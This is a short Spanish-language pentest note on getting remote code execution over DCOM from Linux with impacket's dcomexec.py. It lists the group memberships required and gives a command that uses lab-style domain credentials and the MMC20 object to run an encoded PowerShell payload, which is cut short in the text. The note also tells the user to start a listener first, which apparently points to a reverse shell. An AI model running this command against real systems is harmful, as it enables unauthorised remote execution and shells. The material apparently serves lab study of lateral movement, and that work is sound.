# Requisitos

- Un usuario con permisos específicos (local and network access)
- Usuarios miembros del grupo "Distributed COM Users"
- Usuarios miembros de "Administrators group"

# Desde linux

### dcomexec.py

Parte del paquete impacket.

##### Obtener RCE

###### 1) iniciamos un listener
###### 2) Corremos dcomexec

    python3 dcomexec.py -object MMC20 INLANEFREIGHT/Josias:Jonny25@172.20.0.52 "powershell -e JABjAGwAaQBlAG...SNIP...AbwBzAGUAKAApAA==" -silentcommand
